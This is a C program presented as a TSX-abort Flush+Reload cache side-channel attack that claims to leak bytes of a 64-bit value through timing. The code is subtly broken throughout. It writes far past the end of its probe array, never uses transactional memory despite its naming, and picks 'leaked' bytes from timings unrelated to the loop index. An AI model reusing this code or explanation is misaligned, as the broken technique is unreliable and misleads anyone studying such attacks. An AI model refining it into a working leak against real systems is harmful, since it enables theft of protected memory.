
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

uint8_t array[256*4096];
uint8_t temp = 0;

// Cache hit time measurement function
static inline uint64_t rdtsc_access(volatile uint8_t *addr) {
    uint64_t time1, time2;
    __asm__ __volatile__ (
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "lfence\n"
        "movl %%eax, %%esi\n"
        "movl (%1), %0\n"
        "lfence\n"
        "rdtsc\n"
        "subl %%esi, %%eax\n"
        : "=a" (time1)
        : "c" (addr)
        : "%esi", "%edx");
    return time1;
}

// Flush+Reload time measurement function
static void time_flush_reload(volatile uint8_t *ptr) {
    uint64_t time;
    _mm_clflush(ptr);
    time = rdtsc_access(ptr);
    if (time < CACHE_HIT_THRESHOLD) {
        temp = *ptr;
    }
}

// Transactional memory-based Flush+Reload attack function
static uint8_t tsxabort_leak_next_byte_by_6prefix(volatile uint8_t *addr) {
    uint8_t value = 0;
    unsigned int i, j, k;
    uint64_t time1, time2;
    unsigned int junk = 0;
    uint8_t *reloadbuffer = &array[256*4096];
    uint8_t *dummy_buffer = &array[256*4096*2];
    memset(reloadbuffer, 1, 256*4096);
    memset(dummy_buffer, 1, 256*4096);
    for (i = 0; i < 256; i++) {
        _mm_clflush(&array[i*4096 + DELTA]);
    }
    for (i = 0; i < 256; i++) {
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            value = i;
        }
    }
    for (j = 0; j < 100; j++) {
        for (k = 0; k < 10; k++) {
            _mm_clflush(&array[value*4096 + DELTA]);
            for (i = 0; i < 100; i++) {
                time_flush_reload(&array[i*4096 + DELTA]);
            }
        }
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            break;
        }
    }
    return value;
}

int main(int argc, char **argv) {
    uint64_t knownvalue = 0x1234567890ABCDEF;
    uint64_t leaked_value = 0;
    uint8_t suffix = 0;
    uint8_t byteval = 0;
    uint8_t bytepos = 0;
    uint8_t mask = 0xFF;
    uint8_t count[256];
    uint8_t *ptr;
    int i, j;
    if (argc == 2) {
        suffix = atoi(argv[1]);
    }
    ptr = (uint8_t*) &knownvalue;
    for (bytepos = 2; bytepos <= 3; bytepos++) {
        memset(count, 0, sizeof(count));
        for (i = 0; i < 100000; i++) {
            ptr[bytepos] ^= mask;
            byteval = tsxabort_leak_next_byte_by_6prefix(&ptr[bytepos]);
            count[byteval]++;
        }
        byteval = 0;
        for (j = 0; j < 256; j++) {
            if (count[j] > count[byteval]) {
                byteval = j;
            }
        }
        leaked_value |= ((uint64_t) byteval) << (bytepos * 8);
    }
    leaked_value |= ((uint64_t) suffix) << 48;
    printf("Leaked value: 0x%016lx\n", leaked_value);
    return 0;
}
